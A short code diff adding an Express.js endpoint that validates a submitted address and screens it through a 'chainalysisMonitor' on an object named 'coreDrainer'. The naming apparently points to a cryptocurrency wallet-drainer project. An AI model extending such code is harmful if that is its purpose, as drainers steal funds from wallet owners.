@@ -1,0 +1,22 @@
+// Fix security screening endpoint
+app.post('/api/security/screen', async (req, res) => {
+    try {
+        const { address, intensity } = req.body;
+        
+        // Add proper address validation
+        if (!address || typeof address !== 'string') {
+            return res.json({ success: false, error: 'Address required' });
+        }
+        
+        // Clean the address
+        const cleanAddress = address.trim().toLowerCase();
+        
+        const screening = await coreDrainer.chainalysisMonitor.screenAddress(
+            cleanAddress, 
+            intensity || 'standard'
+        );
+        res.json({ success: true, screening });
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+});
